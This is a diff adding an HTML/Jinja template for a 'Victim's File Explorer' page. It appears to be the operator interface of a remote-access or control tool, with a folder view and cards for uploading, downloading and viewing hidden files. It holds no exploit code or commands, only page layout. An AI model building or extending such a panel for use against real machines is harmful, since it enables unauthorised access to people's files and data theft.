@@ -1,0 +1,31 @@
+{% extends "base.html" %}
+{% block content %}
+<h1>📁 Victim's File Explorer</h1>
+
+<div class="flex-row">
+    <div class="flex-col status-card" id="explorer-container">
+        <p>📂 Current Folder: <span id="current-path" style="margin-left: 2px;">/</span></p>
+        <ul id="file-list">
+            <li>Loading...</li>
+        </ul>
+    </div>
+    
+    <div id="explorer-updownload" class="flex-col">
+        <div class="flex-col status-card">
+            {% include "partials/upload_card.html" %}
+        </div>
+
+        <div class="flex-col status-card">
+            {% include "partials/download_card.html" %}
+        </div>
+
+        <div class="flex-col status-card">
+            {% include "partials/hidden_files_card.html" %}
+        </div>
+            
+    </div>
+</div>
+
+<script src="{{ url_for('static', filename='js/explorer.js') }}"></script>
+
+{% endblock %}
